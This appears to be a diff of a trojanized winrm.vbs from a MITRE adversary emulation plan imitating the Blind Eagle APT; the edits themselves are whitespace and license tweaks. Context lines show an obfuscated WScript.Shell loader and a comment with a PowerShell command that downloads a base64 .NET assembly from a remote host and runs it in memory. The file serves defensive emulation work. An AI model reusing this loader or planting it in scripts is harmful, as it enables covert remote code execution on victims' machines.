@@ -11,12 +11,12 @@
    '        T1059.003 Command and Scripting Interpreter Windows Command Shell
    '        T1059.001 Command and Scripting Interpreter PowerShell
    '        T1132.001 Data Encoding: Standard Encoding
-   '        T1140 Deobfuscate/Decode files for informations    
+   '        T1140 Deobfuscate/Decode files for informations
    '    CTI:
    '        https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
    '        https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/
    '    License:
-   '        © 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076
+   '        © 2023 The MITRE Corporation, LLC. Approved for Public Release. Document number CT0076
    '        Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 '
 ' Copyright (c) Microsoft Corporation.  All rights reserved.
@@ -50,8 +50,8 @@ private const L_BADMATCNT1_Message      = "Unexpected match count - one match is
 private const L_OPTNOTUNQ_Message       = "Option is not unique: "
 private const L_URIMISSING_Message      = "URI is missing"
 private const L_ACTIONMISSING_Message   = "Action is missing"
-private const L_URIZERO_Message         = "URI is 0 length"    
-private const L_URIZEROTOK_Message      = "Invalid URI, token is 0 length"    
+private const L_URIZERO_Message         = "URI is 0 length"
+private const L_URIZEROTOK_Message      = "Invalid URI, token is 0 length"
 private const L_INVWMIURI1_Message      = "Invalid WMI resource URI - no '/' found  (at least 2 expected)"
 private const L_INVWMIURI2_Message      = "Invalid WMI resource URI - only one '/' found (at least 2 expected)"
 private const L_NOLASTTOK_Message       = "Invalid URI - cannot locate last token for root node name"
@@ -223,7 +223,7 @@ private const L_HelpDelete_010_0_Message = ""
 
 '''''''''''''''''''''
 ' HELP - ENUMERATE
-private const L_HelpEnum_001_0_Message = "winrm enumerate RESOURCE_URI [-ReturnType:Value] [-Shallow]" 
+private const L_HelpEnum_001_0_Message = "winrm enumerate RESOURCE_URI [-ReturnType:Value] [-Shallow]"
 private const L_HelpEnum_001_1_Message = "         [-BasePropertiesOnly] [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
 private const L_HelpEnum_002_0_Message = ""
 private const L_HelpEnum_003_0_Message = "Lists instances of RESOURCE_URI."
@@ -321,7 +321,7 @@ private const X_HelpHelpMessaage_003_0_Message = "Displays error message associa
 private const X_HelpHelpMessaage_004_0_Message = "Example:"
 private const X_HelpHelpMessaage_006_0_Message = "  winrm helpmsg 0x5"
    ' Create varaibles for the strings associated with command
-   ' Command ends up being: 
+   ' Command ends up being:
    ' powershell.exe [Byte[]] $rOWg = [system.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(http://172.16.1.5/dll/new_rump_vb.net.txt));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null, [object[]]) ('https://cdn.discordapp.com/attachments/<number>/asy.txt'))
    Set WWUP = WScript.CreateObject("WScript.Shell")
     dim bIUv , hsPd ,zhXc ,ZfiH ,hrHK ,CIQKZHH ,UWGWaLq ,cDqeUhv ,UUkXaLU ,bIUv0
@@ -441,7 +441,7 @@ private const L_HelpConfigTransport_011_0_Message = "  CertificateThumbprint - h
 private const L_HelpConfigTransport_012_0_Message = "    Server Authentication."
 private const L_HelpConfigTransport_013_0_Message = "Note: If only Hostname is supplied, WinRM will try to find an appropriate"
 private const L_HelpConfigTransport_014_0_Message = "certificate."
-   
+
 private const L_HelpConfigExamples_001_0_Message = "Example: To listen for requests on HTTP on all IPs on the machine:"
 private const X_HelpConfigExamples_002_0_Message = "  winrm create winrm/config/listener?Address=*+Transport=HTTP"
 private const L_HelpConfigExamples_003_0_Message = ""
